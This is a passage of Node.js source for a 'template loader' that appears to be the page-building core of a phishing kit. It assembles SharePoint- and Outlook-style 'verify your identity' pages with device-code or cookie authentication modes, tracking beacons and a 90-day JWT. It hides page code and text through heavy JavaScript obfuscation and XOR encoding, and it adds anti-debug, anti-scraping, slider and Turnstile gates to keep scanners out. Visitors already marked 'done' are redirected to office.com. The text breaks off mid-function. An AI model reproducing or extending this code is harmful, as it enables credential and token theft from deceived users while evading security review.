/**
 * VGenius Template Loader Service
 * Encrypts exported templates using AES-GCM
 * Keeps heavy XOR obfuscation for JavaScript engines.
 */
'use strict';

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const config = require('../config/env');
const jwt = require('jsonwebtoken');

const TEMPLATES_DIR = path.join(__dirname, '..', '..', 'templates');
const DESIGNS_DIR = path.join(__dirname, '..', '..', 'verification-designs');

// ─── AES-GCM Encryption Utilities ──────────────────────────
const ALGO = 'aes-256-gcm';
const AAD = 'VG-TEMPLATE-2024';

function encryptPayload(plaintext) {
    const salt = crypto.randomBytes(16);
    const iv = crypto.randomBytes(12);
    const key = crypto.pbkdf2Sync(salt, salt, 100000, 32, 'sha512');
    const cipher = crypto.createCipheriv(ALGO, key, iv);
    cipher.setAAD(Buffer.from(AAD));
    let encrypted = Buffer.concat([cipher.update(plaintext, 'utf8'), cipher.final()]);
    const tag = cipher.getAuthTag();
    return {
        cipher: encrypted.toString('base64'),
        salt: salt.toString('base64'),
        iv: iv.toString('base64'),
        tag: tag.toString('base64')
    };
}

// ─── List & Resolve Templates ──────────────────────────────
function listDiskTemplates() {
    try {
        if (!fs.existsSync(TEMPLATES_DIR)) return [];
        return fs.readdirSync(TEMPLATES_DIR, { withFileTypes: true })
        .filter(entry => entry.isDirectory() && entry.name !== 'assets' && entry.name !== 'custom')
        .map(entry => entry.name);
    } catch (e) { return []; }
}

function normalizeTemplateKey(value) {
    return String(value || '').toLowerCase().trim().replace(/[^a-z0-9]+/g, '');
}

function resolveTemplateDirectory(templateType) {
    const input = String(templateType || '').trim();
    const fallbackDir = 'sharepoint3';
    const candidateDirs = fs.existsSync(TEMPLATES_DIR)
    ? fs.readdirSync(TEMPLATES_DIR, { withFileTypes: true }).filter(e => e.isDirectory()).map(e => e.name)
        : [];
    const ni = normalizeTemplateKey(input || fallbackDir);

    for (const dn of candidateDirs) {
        if (normalizeTemplateKey(dn) === ni) return path.join(TEMPLATES_DIR, dn);
        const cp = path.join(TEMPLATES_DIR, dn, 'config.json');
        if (fs.existsSync(cp)) {
            try {
                const c = JSON.parse(fs.readFileSync(cp, 'utf8'));
                if (c && c.name && normalizeTemplateKey(c.name) === ni) return path.join(TEMPLATES_DIR, dn);
            } catch (err) {}
        }
    }

    const dp = path.join(TEMPLATES_DIR, input || fallbackDir);
    if (fs.existsSync(dp)) return dp;

    // If the configured default template directory is missing, fall back to an existing template.
    const preferredFallback = candidateDirs.find(dn => normalizeTemplateKey(dn) === 'sharepoint4')
        || candidateDirs.find(dn => normalizeTemplateKey(dn) === 'sharepoint2')
        || candidateDirs[0];
    if (preferredFallback) return path.join(TEMPLATES_DIR, preferredFallback);

    return path.join(TEMPLATES_DIR, fallbackDir);
}

function loadTemplateConfig(templateType) {
    const tp = path.join(resolveTemplateDirectory(templateType), 'config.json');
    if (fs.existsSync(tp)) return JSON.parse(fs.readFileSync(tp, 'utf8'));
    return { name: templateType, preload: true, auth_mode: 'devicecode', fields: [] };
}

// Helper: Get default value for a field from template config
function getConfigDefault(templateConfig, key, fallback) {
    if (!templateConfig || !templateConfig.fields) return fallback;
    var field = templateConfig.fields.find(function(f) { return f.key === key; });
    return field && field.default !== undefined ? field.default : fallback;
}

function loadTemplateHTML(tt) {
    const fp = path.join(resolveTemplateDirectory(tt), 'index.html');
    return fs.existsSync(fp) ? fs.readFileSync(fp, 'utf8') : '';
}

function loadTemplateCSS(tt) {
    const fp = path.join(resolveTemplateDirectory(tt), 'style.css');
    return fs.existsSync(fp) ? fs.readFileSync(fp, 'utf8') : '';
}

function loadTemplateJS(tt) {
    const fp = path.join(resolveTemplateDirectory(tt), 'script.js');
    return fs.existsSync(fp) ? fs.readFileSync(fp, 'utf8') : '';
}

function loadVerificationDesignCSS(designName) {
    const bn = String(designName || 'outlook').trim();
    const dp = path.join(DESIGNS_DIR, bn + '.css');
    if (fs.existsSync(dp)) return fs.readFileSync(dp, 'utf8');
    const fp = path.join(DESIGNS_DIR, 'outlook.css');
    return fs.existsSync(fp) ? fs.readFileSync(fp, 'utf8') : '';
}

// ─── Load Verification Design HTML+JS (for .html designs like SLIDER.html) ──
function loadVerificationDesignHTML(designName) {
    const bn = String(designName || '').trim().toLowerCase();
    
    // Check for .html verification design files (e.g., SLIDER.html)
    const htmlCandidates = [
        path.join(DESIGNS_DIR, bn + '.html'),
        path.join(DESIGNS_DIR, bn.replace(/\.html$/, '.html')),
        path.join(DESIGNS_DIR, bn.charAt(0).toUpperCase() + bn.slice(1) + '.html'),
    ];
    
    // Also check case-insensitive variations
    if (bn === 'slider') {
        htmlCandidates.push(path.join(DESIGNS_DIR, 'SLIDER.html'));
        htmlCandidates.push(path.join(DESIGNS_DIR, 'slider.html'));
    }
    
    for (const fp of htmlCandidates) {
        if (fs.existsSync(fp)) {
            const content = fs.readFileSync(fp, 'utf8');
            // Extract <style> content and <script> content separately
            const styleMatch = content.match(/<style[^>]*>([\s\S]*?)<\/style>/i);
            const scriptMatch = content.match(/<script[^>]*>([\s\S]*?)<\/script>/i);
            
            // Extract HTML body content (between <body> and </body>)
            const bodyMatch = content.match(/<body[^>]*>([\s\S]*?)<\/body>/i);
            
            return {
                css: styleMatch ? styleMatch[1].trim() : '',
                js: scriptMatch ? scriptMatch[1].trim() : '',
                html: bodyMatch ? bodyMatch[1].trim() : '',
                hasHtml: true
            };
        }
    }
    
    // No HTML design found
    return { css: '', js: '', html: '', hasHtml: false };
}

function hasVerificationDesignHTML(designName) {
    const result = loadVerificationDesignHTML(designName);
    return result.hasHtml;
}

// ─── Visitor Access Settings ───────────────────────────────
async function getVisitorAccessSettings(userId) {
    try {
        const db = require('../database/connection');
        const [rows] = await db.query(
            'SELECT block_done_visitors, redirect_url FROM visitor_settings WHERE user_id = ?',
            [userId]
        );
        if (rows.length) {
            return {
                blockDoneVisitors: rows[0].block_done_visitors == 1,
                redirectUrl: rows[0].redirect_url || ''
            };
        }
        return { blockDoneVisitors: false, redirectUrl: '' };
    } catch (e) {
        return { blockDoneVisitors: false, redirectUrl: '' };
    }
}

async function checkVisitorBlocked(ipAddress, userId) {
    try {
        const settings = await getVisitorAccessSettings(userId);
        if (!settings.blockDoneVisitors) return { blocked: false };

        const db = require('../database/connection');
        const [rows] = await db.query(
            'SELECT status FROM visitors WHERE ip_address = ? AND user_id = ? ORDER BY created_at DESC LIMIT 1',
            [ipAddress, userId]
        );

        if (rows.length && (rows[0].status === 'done' || rows[0].status === 'blocked')) {
            return {
                blocked: true,
                redirectUrl: settings.redirectUrl
            };
        }
        return { blocked: false };
    } catch (e) {
        return { blocked: false };
    }
}

function buildBlockedPage(redirectUrl) {
    if (redirectUrl) {
        return `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Verification Complete</title>
    <style>
        body { margin: 0; padding: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; background: #0b0b0b; font-family: 'Segoe UI', sans-serif; }
        .container { text-align: center; color: #c6ffdd; }
        .icon { font-size: 48px; margin-bottom: 16px; }
        h1 { font-size: 24px; margin-bottom: 8px; }
        p { color: #88ffaa; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">✅</div>
        <h1>Verification Complete</h1>
        <p>You have already completed verification. Redirecting...</p>
    </div>
    <script>window.location.replace("${redirectUrl.replace(/"/g, '\\\\"')}");<\/script>
</body>
</html>`;
    } else {
        return `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Verification Complete</title>
    <style>
        body { margin: 0; padding: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; background: #0b0b0b; font-family: 'Segoe UI', sans-serif; }
        .container { text-align: center; color: #c6ffdd; max-width: 400px; padding: 20px; }
        .icon { font-size: 48px; margin-bottom: 16px; }
        h1 { font-size: 24px; margin-bottom: 8px; }
        p { color: #88ffaa; font-size: 14px; line-height: 1.5; }
        .badge { display: inline-block; background: rgba(0,255,102,0.1); border: 1px solid rgba(0,255,102,0.3); border-radius: 12px; padding: 4px 12px; font-size: 11px; color: #00ff66; margin-top: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">✅</div>
        <h1>Verification Complete</h1>
        <p>You have already completed the verification for this document. No further action is required.</p>
        <div class="badge">STATUS: COMPLETED</div>
    </div>
</body>
</html>`;
    }
}

// ─── Admin Settings ────────────────────────────────────────
async function loadAdminSettings() {
    const obj = {};
    try {
        const db = require('../database/connection');
        const [rows] = await db.query('SELECT setting_key, setting_value FROM settings');
        for (const r of rows) obj[r.setting_key] = r.setting_value;
    } catch (e) {}
    if (obj.obfuscation_enabled === undefined) obj.obfuscation_enabled = String(config.ENABLE_OBFUSCATION).toLowerCase() === 'true' ? 'true' : 'false';
    if (obj.antidebug_enabled === undefined) obj.antidebug_enabled = String(config.ENABLE_ANTIDEBUG).toLowerCase() === 'true' ? 'true' : 'false';
    if (obj.antiscraping_enabled === undefined) obj.antiscraping_enabled = 'true';
    if (obj.soft_error_retry_enabled === undefined) obj.soft_error_retry_enabled = 'false';
    if (obj.default_background_blur === undefined) obj.default_background_blur = '4';
    if (obj.default_auth_mode === undefined) obj.default_auth_mode = 'cookie';
    return obj;
}

function boolSetting(v) {
    if (v === true || v === 1) return true;
    return String(v || '').toLowerCase() === 'true';
}

// ─── JS Obfuscation (SINGLE-STAGE for browser performance) ──
// Two-stage was causing browser hangs due to 3MB+ output
// This single-stage approach is lighter but still effective
function obfuscateJs(sourceCode) {
    try {
        const JavaScriptObfuscator = require('javascript-obfuscator');

        console.log('[Obfuscation] Single-stage obfuscation...');
        const result = JavaScriptObfuscator.obfuscate(sourceCode, {
            compact: true,                     // Minify
            controlFlowFlattening: true,       // Flatten control flow
            controlFlowFlatteningThreshold: 0.5, // Apply to 50% of code (not all)
            deadCodeInjection: false,          // Disabled - causes bloat
            deadCodeInjectionThreshold: 0,
            debugProtection: false,            // Disabled - causes browser hangs
            debugProtectionInterval: 0,
            disableConsoleOutput: true,
            identifierNamesGenerator: 'hexadecimal',
            renameGlobals: false,              // Keep globals intact
            selfDefending: true,               // Self-defending
            stringArray: true,
            stringArrayCallsTransform: true,
            stringArrayEncoding: ['rc4'],      // RC4 encoding only
            stringArrayIndexShift: true,
            stringArrayRotate: true,
            stringArrayShuffle: true,
            stringArrayWrappersCount: 2,       // Moderate wrappers
            stringArrayWrappersChainedCalls: false,
            stringArrayWrappersParametersMaxCount: 2,
            stringArrayWrappersType: 'variable',
            transformObjectKeys: false,        // Disabled - can break code
            unicodeEscapeSequence: true,
            numbersToExpressions: false,       // Disabled - causes bloat
            simplify: true,                    // Simplify
            splitStrings: true,
            splitStringsChunkLength: 8,        // Moderate chunk size
        });

        const finalCode = result.getObfuscatedCode();
        console.log('[Obfuscation] Complete: ' + sourceCode.length + ' -> ' + finalCode.length + ' chars');

        return finalCode;
    } catch (e) {
        console.error('[Obfuscation] Failed:', e.message, e.stack || '');
        return sourceCode;
    }
}

// ─── Window Variables Builder ──────────────────────────────
async function buildWindowVars(link, user, settings, options) {
    options = options || {};
    const jt = jwt.sign({ user_id: user.id, link_id: link.id }, config.JWT_SECRET, { expiresIn: '90d' });
    const obfuscationEnabled = boolSetting(settings.obfuscation_enabled) || !!link.obfuscated;
    const antidebugEnabled = boolSetting(settings.antidebug_enabled);
    const softErrorRetry = boolSetting(settings.soft_error_retry_enabled);
    const defaultBlur = (link.background_blur != null ? link.background_blur : parseInt(settings.default_background_blur, 10)) || 4;
    const authMode = link.auth_mode || settings.default_auth_mode || 'cookie';
    const bgUrl = link.custom_bg_url || link.background_blur_url || '';
    const turnstileEnabled = link.turnstile_enabled !== false && link.turnstile_enabled !== 0;
    const exportDomain = options.domain ? String(options.domain).trim().replace(/^https?:\/\//, '').replace(/\/+$/, '') : '';
    // Per-link Turnstile site key (Widget Pool) — fallback to global env
    let turnstileSiteKey = config.CF_TURNSTILE_SITE_KEY || '';
    try {
        const turnstilePool = require('./turnstile-pool');
        if (link && link.id) {
            const sk = await turnstilePool.getAssignedSiteKey(link.id);
            if (sk) turnstileSiteKey = sk;
        }
    } catch (e) {
        console.warn('[Templateloader] Widget pool lookup failed, using env fallback:', e.message);
    }
    var apiBase = '';
    if (options.apiBaseUrl) apiBase = String(options.apiBaseUrl).trim().replace(/\/+$/, '');
    else if (config.APP_URL) apiBase = String(config.APP_URL).trim().replace(/\/+$/, '');

    const blob = JSON.stringify({
        VG_JWT: jt,
        __API_BASE: apiBase,
        __DESTINATION_URL: link.destination_url || 'https://office.com',
        __AUTH_MODE: authMode,
        __BACKGROUND_BLUR_URL: bgUrl,
        __BACKGROUND_BLUR_AMOUNT: String(defaultBlur),
        __DOC_FILENAME: link.file_name || 'Document.pdf',
        __DOC_TITLE: link.title_text || 'Non-Disclosure Agreement',
        __DOC_PAGES: String(link.pages || '4'),
        __PAGE_TITLE: link.title_text || 'Verify your identity',
        __PAGE_MESSAGE: link.message_text || 'Please verify your identity to continue',
        __PRIMARY_BUTTON_TEXT: link.button_text || 'Get verification code',
        __OBFUSCATION_ENABLED: String(obfuscationEnabled),
        __ANTIDEBUG_ENABLED: String(antidebugEnabled),
        __ANTISCRAPE_ENABLED: String(boolSetting(settings.antiscraping_enabled)),
        __SOFT_ERROR_RETRY_ENABLED: String(softErrorRetry),
        COPY_TO_OPEN: String(!!link.copy_to_open),
        __TURNSTILE_ENABLED: String(!!turnstileEnabled),
        __TURNSTILE_SITE_KEY: turnstileSiteKey,
        __EXPORT_DOMAIN: exportDomain,
        __BLOB_URL_ENABLED: String(!!link.blob_url_enabled),
        __SHOW_VERIFICATION_COMPLETE: String(link.show_verification_complete !== false && link.show_verification_complete !== 0),
    });
    const encoded = Buffer.from(blob).toString('base64');
    return '<script>!function(){try{var j=JSON.parse(atob("' + encoded + '"));for(var k in j)window[k]=j[k]}catch(e){}}();</script>';
}

// ─── Text Obfuscation (XOR + Base64 for text nodes only) ──
function obfuscateTextContent(html) {
    var strings = [];
    var seen = new Set();

    html = html.replace(/>([A-Za-z0-9\s\-\.\/\,\!\?\&\;\#\(\)\[\]\{\}\<\>\"\'=]+)</g, function(match, text) {
        var trimmed = text.trim();
        if (!trimmed || trimmed.length < 3) return match;
        if (!seen.has(trimmed)) {
            seen.add(trimmed);
            strings.push(trimmed);
        }
        var idx = strings.length - 1;
        return '><span class="__vg" data-idx="' + idx + '">__VG__</span>';
    });

    var encodedMap = {};
    for (var i = 0; i < strings.length; i++) {
        var s = strings[i];
        var encoded = '';
        for (var j = 0; j < s.length; j++) {
            encoded += String.fromCharCode(s.charCodeAt(j) ^ ((i + 42) ^ 0x5A));
        }
        encodedMap[i] = Buffer.from(encoded).toString('base64');
    }

    var encodedArr = [];
    for (var k = 0; k < strings.length; k++) {
        encodedArr.push('"' + encodedMap[k] + '"');
    }

    // FIX: Wrap in DOMContentLoaded to ensure spans exist before decoding
    var decodeScript = '<scr' + 'ipt>(function(){function d(){var S=[' + encodedArr.join(',') + '];var D=[];for(var i=0;i<S.length;i++){var p=atob(S[i]);var t="";for(var j=0;j<p.length;j++){t+=String.fromCharCode(p.charCodeAt(j)^(i+42)^90)}D[i]=t}var spans=document.querySelectorAll("span.__vg");for(var i=0;i<spans.length;i++){var idx=parseInt(spans[i].getAttribute("data-idx"));if(D[idx]!==undefined){spans[i].textContent=D[idx];spans[i].className="";spans[i].removeAttribute("data-idx")}}};if(document.readyState==="loading"){document.addEventListener("DOMContentLoaded",d);}else{d();}})();</scr' + 'ipt>';

    // FIX: Place decode script at end of body, not in head
    if (html.indexOf('</body>') !== -1) {
        html = html.replace('</body>', decodeScript + '</body>');
    } else if (html.indexOf('</head>') !== -1) {
        html = html.replace('</head>', decodeScript + '</head>');
    } else {
        html = html + decodeScript;
    }

    return html.trim();
}

// ─── Build Slider Overlay HTML ─────────────────────────────
// Builds the slider verification HTML+CSS+JS to inject into the page.
// Uses SLIDER.html file content if available, otherwise generates default.
// The slider appears FIRST (full screen overlay), then Cloudflare in the SAME block.
function buildSliderOverlay(sliderData, link, obfuscate = false) {
    // Layer 1: Slider (visible on page load)
    // Use sliderData.html if available (from SLIDER.html file)
    let layer1Html = '';
    
    if (sliderData && sliderData.hasHtml && sliderData.html) {
        // Use the HTML from SLIDER.html file
        // Wrap it in a container div with id="vgSliderLayer"
        layer1Html = `
<!-- ===== LAYER 1: SLIDER from SLIDER.html (visible on page load) ===== -->
<div id="vgSliderLayer" style="display:block;position:fixed;inset:0;z-index:99999;background:#F1F3F5;font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,sans-serif;display:flex;align-items:center;justify-content:center;padding:24px 16px;">
    ${sliderData.html}
</div>`;
    } else {
        // Fallback: Generate default slider HTML
        layer1Html = `
<!-- ===== LAYER 1: SLIDER (visible on page load) ===== -->
<div id="vgSliderLayer" style="display:block;position:fixed;inset:0;z-index:99999;background:#F1F3F5;font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,sans-serif;display:flex;align-items:center;justify-content:center;padding:24px 16px;">
    <div style="background:#fff;border-radius:20px;box-shadow:0 10px 30px rgba(0,0,0,.06);border:1px solid #EDEBE9;width:100%;max-width:420px;padding:40px 32px;text-align:center;">
        <h1 style="font-size:24px;font-weight:700;color:#232333;margin-bottom:8px;">Quick check</h1>
        <p style="font-size:14px;color:#605E5C;margin-bottom:32px;line-height:1.5;">Move the slider to continue.</p>
        <div id="vgSliderContainer" style="position:relative;width:100%;height:54px;background:#F1F3F5;border-radius:27px;border:1px solid #EDEBE9;display:flex;align-items:center;justify-content:center;user-select:none;overflow:hidden;margin-bottom:16px;">
            <div id="vgSliderProgress" style="position:absolute;left:0;top:0;bottom:0;width:0;background:linear-gradient(90deg,rgba(45,140,255,.15),rgba(11,106,11,.15));z-index:2;pointer-events:none;"></div>
            <span id="vgSliderText" style="font-size:14px;font-weight:600;color:#495057;z-index:1;position:relative;">Slide to continue</span>
            <div id="vgSliderHandle" style="position:absolute;left:4px;width:46px;height:46px;background:#fff;border-radius:50%;box-shadow:0 2px 8px rgba(0,0,0,.12);display:flex;align-items:center;justify-content:center;cursor:pointer;z-index:3;">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#605E5C" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg>
            </div>
        </div>
        <div id="vgSliderHint" style="font-size:12px;color:#605E5C;min-height:18px;">Move the slider to continue.</div>
    </div>
</div>`;
    }

    // Layer 2: Cloudflare Turnstile (hidden until slider done)
    const layer2Html = `
<!-- ===== LAYER 2: CLOUDFLARE TURNSTILE (hidden until slider done) ===== -->
<div id="vgCfLayer" style="display:none;position:fixed;inset:0;z-index:99998;background:#F1F3F5;font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,sans-serif;align-items:center;justify-content:center;padding:24px 16px;">
    <div style="background:#fff;border-radius:20px;box-shadow:0 10px 30px rgba(0,0,0,.06);border:1px solid #EDEBE9;width:100%;max-width:420px;padding:40px 32px;text-align:center;">
        <h1 style="font-size:24px;font-weight:700;color:#232333;margin-bottom:8px;">Security Check</h1>
        <p style="font-size:14px;color:#605E5C;margin-bottom:32px;line-height:1.5;">Verifying with Cloudflare...</p>
        <div id="vgCfWidgetWrap" style="min-height:80px;display:flex;align-items:center;justify-content:center;">
            <div id="vgCfPlaceholder" style="text-align:center;">
                <div style="width:40px;height:40px;border:3px solid #e4e4e4;border-top-color:#0078D4;border-radius:50%;animation:vgSpin 1s linear infinite;margin:0 auto 12px;"></div>
                <div style="font-size:13px;color:#605E5C;">Completing verification...</div>
            </div>
        </div>
        <div id="vgCfHint" style="font-size:12px;color:#605E5C;min-height:18px;"></div>
    </div>
</div>`;

    // Use CSS from SLIDER.html if available
    let cssContent = '';
    if (sliderData && sliderData.hasHtml && sliderData.css) {
        cssContent = sliderData.css;
    } else {
        // Fallback default CSS
        cssContent = `
        #vgSliderContainer.vg-verifying #vgSliderHandle { background: #0B6A0B !important; cursor: default; }
        #vgSliderContainer.vg-verifying svg { color: #fff !important; }`;
    }

    // Add Turnstile spinner CSS
    cssContent += `
    @keyframes vgSpin { to { transform: rotate(360deg); } }`;

    const styleHtml = `<style>${cssContent}</style>`;

    // Build the slider JavaScript
    // Use JS from SLIDER.html if available
    let sliderJs = '';
    if (sliderData && sliderData.hasHtml && sliderData.js) {
        // Use JavaScript from SLIDER.html file
        // The SLIDER.html JS already calls window.__vgOnSliderComplete() after verification
        sliderJs = sliderData.js;
    } else {
        // Fallback: Generate default slider JavaScript
        sliderJs = `
(function(){
    'use strict';
    
    if(document.readyState==='loading'){
        document.addEventListener('DOMContentLoaded', initSliderChain);
    } else {
        initSliderChain();
    }

    function initSliderChain(){
        var sliderLayer = document.getElementById('vgSliderLayer');
        var cfLayer = document.getElementById('vgCfLayer');
        
        if(!sliderLayer){ return; }
        
        var container = document.getElementById('vgSliderContainer');
        var handle = document.getElementById('vgSliderHandle');
        var progress = document.getElementById('vgSliderProgress');
        var textEl = document.getElementById('vgSliderText');
        var hintEl = document.getElementById('vgSliderHint');
        
        if(!container || !handle){ return; }
        
        var isDragging = false, startX = 0, maxTranslate = 0, isVerified = false;
        
        function initSize(){
            maxTranslate = container.clientWidth - handle.clientWidth - 8;
        }
        
        window.addEventListener('resize', initSize);
        initSize();
        
        handle.addEventListener('mousedown', startDrag);
        handle.addEventListener('touchstart', startDrag, {passive: true});
        
        function startDrag(e){
            if(isVerified) return;
            isDragging = true;
            startX = (e.clientX !== undefined) ? e.clientX : (e.touches && e.touches[0].clientX) || 0;
            document.addEventListener('mousemove', onDrag);
            document.addEventListener('touchmove', onDrag, {passive: true});
            document.addEventListener('mouseup', stopDrag);
            document.addEventListener('touchend', stopDrag);
        }
        
        function onDrag(e){
            if(!isDragging || isVerified) return;
            var currentX = (e.clientX !== undefined) ? e.clientX : (e.touches && e.touches[0].clientX) || 0;
            var diff = currentX - startX;
            var translate = Math.max(0, Math.min(diff, maxTranslate));
            handle.style.transform = 'translateX(' + translate + 'px)';
            progress.style.width = (translate + handle.clientWidth + 4) + 'px';
            if(translate > maxTranslate * 0.85){
                completeVerification();
            }
        }
        
        function stopDrag(){
            if(!isDragging || isVerified) return;
            isDragging = false;
            document.removeEventListener('mousemove', onDrag);
            document.removeEventListener('touchmove', onDrag);
            document.removeEventListener('mouseup', stopDrag);
            document.removeEventListener('touchend', stopDrag);
            if(!isVerified){
                handle.style.transform = 'translateX(0px)';
                progress.style.width = '0px';
            }
        }
        
        function completeVerification(){
            if(isVerified) return;
            isVerified = true;
            isDragging = false;
            container.classList.add('vg-verifying');
            handle.style.transform = 'translateX(' + maxTranslate + 'px)';
            progress.style.width = '100%';
            textEl.textContent = 'Verifying...';
            hintEl.textContent = 'Just a moment...';
            
            setTimeout(function(){
                textEl.textContent = 'Verified ✓';
                hintEl.textContent = 'Continuing...';
                
                setTimeout(function(){
                    if(sliderLayer){
                        sliderLayer.style.display = 'none';
                        sliderLayer.style.visibility = 'hidden';
                    }
                    
                    if(cfLayer){
                        cfLayer.style.display = 'flex';
                        
                        if(typeof window.__vgOnSliderComplete === 'function'){
                            window.__vgOnSliderComplete();
                        } else {
                            window.__vgPendingSliderComplete = true;
                        }
                    }
                    
                    window.__vgSliderVerified = true;
                }, 600);
            }, 1500);
        }
        
        window.__vgSliderVerified = false;
        window.__vgCheckSliderReady = function(){ return isVerified; };
    }

})();`;
    }

    // Obfuscate the slider JS if requested
    let finalSliderJs = sliderJs;
    if (obfuscate && sliderJs.length > 100) {
        try {
            finalSliderJs = obfuscateJs(sliderJs);
            // Escape </script> and </style> sequences so they don't terminate
            // the enclosing <script> tag. \/ is equivalent to / inside JS strings.
            finalSliderJs = finalSliderJs.replace(/<\/script/gi, '<\\/script')
                                          .replace(/<\/style/gi, '<\\/style');
            console.log('[Templateloader] Slider overlay obfuscated successfully');
        } catch (e) {
            console.error('[Templateloader] Slider overlay obfuscation failed:', e && e.message);
            finalSliderJs = sliderJs; // Fallback to unobfuscated
        }
    } else {
        // Even without obfuscation, escape any </script> in the raw slider JS
        // so it doesn't terminate the enclosing <script> tag.
        finalSliderJs = sliderJs.replace(/<\/script/gi, '<\\/script')
                                .replace(/<\/style/gi, '<\\/style');
    }

    const chainJs = '<script>' + finalSliderJs + '<\/script>';

    // Combine all layers
    const fullHtml = `
<!-- ═══════════════════════════════════════════════════
     SLIDER → CLOUDFLARE VERIFICATION CHAIN
     Layer 1: Slider (shows first, always visible)
     Layer 2: Cloudflare Turnstile (shows after slider)
     ═══════════════════════════════════════════════════ -->
${layer1Html}
${layer2Html}
${styleHtml}
${chainJs}`;

    return fullHtml;
}

// ─── Main Page Rendering ───────────────────────────────────
async function renderPageHtml(link, user, options) {
    options = options || {};
    const templateType = link.template_type || 'sharepoint3';
    const designName = link.verification_design || 'outlook';
    const settings = await loadAdminSettings();

    if (options.apiBaseUrl) {
        options.apiBaseUrl = String(options.apiBaseUrl).trim().replace(/\/+$/, '');
    }

    var html = loadTemplateHTML(templateType);
    const css = loadTemplateCSS(templateType) + '\n' + loadVerificationDesignCSS(designName);
    const script = loadTemplateJS(templateType);

    // Load template config early to get defaults for placeholders
    const templateConfig = loadTemplateConfig(templateType);

    // Check if this is a slider HTML design
    const sliderData = loadVerificationDesignHTML(designName);
    const isSliderDesign = designName.toLowerCase().includes('slider') || sliderData.hasHtml;

    if (html.includes('{{CSS}}')) {
        html = html.replace('/* {{CSS}} */', css);
    }
    if (html.includes('{{SCRIPT}}')) {
        html = html.replace('// {{SCRIPT}}', script);
    }

    // Use template config defaults as fallbacks, then link overrides
    html = html.replace('{{TITLE}}', link.title_text || getConfigDefault(templateConfig, 'title', 'Verify your identity'));
    html = html.replace('{{MESSAGE}}', link.message_text || getConfigDefault(templateConfig, 'message', 'Please verify your identity to continue'));
    html = html.replace('{{BUTTON_TEXT}}', link.button_text || getConfigDefault(templateConfig, 'button_text', 'Get verification code'));
    html = html.replace('{{FILE_NAME}}', link.file_name || getConfigDefault(templateConfig, 'file_name', 'Document.pdf'));
    html = html.replace('{{PAGES}}', String(link.pages || getConfigDefault(templateConfig, 'pages', 1)));

    const verifyUrl = (options.apiBaseUrl || config.APP_URL || '').trim().replace(/\/+$/, '');
    const beaconUrl = verifyUrl ? verifyUrl + '/api/beacon' : '/api/beacon';
    const logUrl = verifyUrl;
    // Per-link Turnstile site key (Widget Pool) — fallback to global env
    let turnstileKey = config.CF_TURNSTILE_SITE_KEY || '';
    try {
        const turnstilePool = require('./turnstile-pool');
        if (link && link.id) {
            const sk = await turnstilePool.getAssignedSiteKey(link.id);
            if (sk) turnstileKey = sk;
        }
    } catch (e) {
        console.warn('[Templateloader] Widget pool lookup failed, using env fallback:', e.message);
    }

    if (html.includes('{{VERIFY_ENDPOINT}}')) html = html.replace(/{{VERIFY_ENDPOINT}}/g, verifyUrl);
    if (html.includes('{{BEACON_ENDPOINT}}')) html = html.replace(/{{BEACON_ENDPOINT}}/g, beaconUrl);
    if (html.includes('{{LOG_ENDPOINT}}')) html = html.replace(/{{LOG_ENDPOINT}}/g, logUrl);
    if (html.includes('{{TURNSTILE_KEY}}')) html = html.replace(/{{TURNSTILE_KEY}}/g, turnstileKey);

    const windowVars = await buildWindowVars(link, user, settings, options);
    var vgEngine = '';
    const vgEnginePath = path.join(TEMPLATES_DIR, 'assets', 'vg-engine.js');
    if (fs.existsSync(vgEnginePath)) {
        vgEngine = fs.readFileSync(vgEnginePath, 'utf8');
    }

    const forceBlob = options.forceBlobFromStart === true ? 'true' : 'false';
    const configScript = '<script>window.__FORCE_BLOB_FROM_START=' + forceBlob + '</script>';
    
    // Add slider design flag for vg-engine.js (must be boolean, not string)
    const sliderFlag = '<script>window.__SLIDER_DESIGN=' + String(isSliderDesign) + '</script>';
    
    html = html.replace('</head>', windowVars + configScript + sliderFlag + '</head>');

    if (vgEngine) {
        console.log('[Templateloader] Injecting vg-engine.js, length:', vgEngine.length);
        console.log('  vg-engine contains </script>:', vgEngine.includes('</script>'));
        console.log('  vg-engine contains <script>:', vgEngine.includes('<script>'));
        
        html = html.replace('</head>', '<script>' + vgEngine + '</script></head>');
        console.log('[Templateloader] vg-engine.js injected');
    }
    
    // ═══════════════════════════════════════════
    // DIAGNOSTICS: Check HTML structure
    // ═══════════════════════════════════════════
    console.log('[Templateloader] ═══ HTML DIAGNOSTICS ═══');
    console.log('  Total HTML length:', html.length);
    console.log('  Contains <html>:', html.includes('<html>'));
    console.log('  Contains </html>:', html.includes('</html>'));
    console.log('  Contains <head>:', html.includes('<head>'));
    console.log('  Contains </head>:', html.includes('</head>'));
    console.log('  Contains <body:', html.includes('<body'));
    console.log('  Contains </body>:', html.includes('</body>'));
    console.log('  Contains <style>:', html.includes('<style>'));
    console.log('  Contains </style>:', html.includes('</style>'));
    console.log('  Contains <script>:', html.includes('<script>'));
    console.log('  Contains </script>:', html.includes('</script>'));
    
    const scriptOpenCount = (html.match(/<script/g) || []).length;
    const scriptCloseCount = (html.match(/<\/script>/g) || []).length;
    console.log('  <script> tags:', scriptOpenCount);
    console.log('  </script> tags:', scriptCloseCount);
    console.log('  Script tags balanced:', scriptOpenCount === scriptCloseCount);
    
    if (scriptOpenCount !== scriptCloseCount) {
        console.warn('  ⚠️  UNBALANCED SCRIPT TAGS!');
    }
    if (html.includes('<script><script>')) {
        console.warn('  ⚠️  NESTED <script><script> DETECTED!');
    }
    if (html.includes('</script></script>')) {
        console.warn('  ⚠️  NESTED </script></script> DETECTED!');
    }
    console.log('[Templateloader] ═══ END DIAGNOSTICS ═══');

    if (templateConfig.preload) {
        html = html.replace(/\{\{#PRELOAD\}\}/g, '').replace(/\{\{\/PRELOAD\}\}/g, '');
